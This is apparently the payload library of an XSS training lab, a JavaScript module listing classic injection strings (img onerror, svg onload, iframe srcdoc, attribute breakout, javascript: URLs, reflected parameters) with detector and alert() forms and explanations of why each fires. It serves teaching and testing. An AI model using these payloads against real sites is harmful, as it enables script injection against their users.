// The payload library: classic injection test strings, grouped by the
// context they attack. `target` says which panel "Try it" loads the
// payload into:
//   guestbook — the guestbook comment field (stored, HTML context)
//   bio       — the profile bio field (HTML context)
//   avatar    — the profile avatar URL field (attribute context)
//   url       — the profile website field (URL context; fires on click)
//   reflected — the ?name= greeting (reflected; fires on page load)
// Payloads call proof('…') so the detector confirms execution; the
// `classic` field is the traditional alert() form, for copying.

export const PAYLOADS = [
  {
    group: "HTML context — event handlers",
    title: "Image onerror",
    payload: `<img src=x onerror=proof('img onerror')>`,
    classic: `<img src=x onerror=alert(1)>`,
    target: "guestbook",
    expect: "Fires immediately: the image fails to load, the error handler runs.",
  },
  {
    group: "HTML context — event handlers",
    title: "SVG onload",
    payload: `<svg onload=proof('svg onload')>`,
    classic: `<svg onload=alert(1)>`,
    target: "guestbook",
    expect: "Fires immediately: SVG elements run onload as soon as they're parsed.",
  },
  {
    group: "HTML context — event handlers",
    title: "Details ontoggle",
    payload: `<details open ontoggle=proof('details ontoggle')>x</details>`,
    classic: `<details open ontoggle=alert(1)>x</details>`,
    target: "bio",
    expect: "Fires immediately: an open <details> toggles on insertion.",
  },
  {
    group: "HTML context — event handlers",
    title: "Input autofocus + onfocus",
    payload: `<input autofocus onfocus=proof('input onfocus')>`,
    classic: `<input autofocus onfocus=alert(1)>`,
    target: "bio",
    expect: "Fires when the inserted field grabs focus — usually straight away.",
  },
  {
    group: "HTML context — event handlers",
    title: "Iframe srcdoc",
    payload: `<iframe srcdoc="<script>parent.proof('iframe srcdoc')</script>"></iframe>`,
    classic: `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
    target: "guestbook",
    expect: "Fires: srcdoc is a whole nested document, and its scripts DO run (same-origin, so it can call parent.proof).",
  },
  {
    group: "HTML context — the control case",
    title: "Plain script tag (should NOT fire)",
    payload: `<script>proof('script tag')</script>`,
    classic: `<script>alert(1)</script>`,
    target: "guestbook",
    expect: "Does not fire: script elements inserted via innerHTML are marked non-executable. If the detector stays quiet, that's the lesson working.",
  },
  {
    group: "Attribute context",
    title: "Attribute breakout (avatar URL)",
    payload: `x" onerror="proof('attribute breakout')`,
    classic: `x" onerror="alert(1)`,
    target: "avatar",
    expect: "Fires: the quote closes the src attribute, onerror becomes a real attribute of the img, and the bogus src triggers it.",
  },
  {
    group: "URL context",
    title: "javascript: link (website field)",
    payload: `javascript:proof('javascript: URL')`,
    classic: `javascript:alert(1)`,
    target: "url",
    expect: "Fires when the preview card's Website link is clicked — the payload is the link itself.",
  },
  {
    group: "Reflected (URL parameter)",
    title: "Reflected SVG in ?name=",
    payload: `<svg onload=proof('reflected svg')>`,
    classic: `<svg onload=alert(1)>`,
    target: "reflected",
    expect: "Fires on page load: the greeting is built from the URL parameter. Try it navigates to the crafted link.",
  },
];
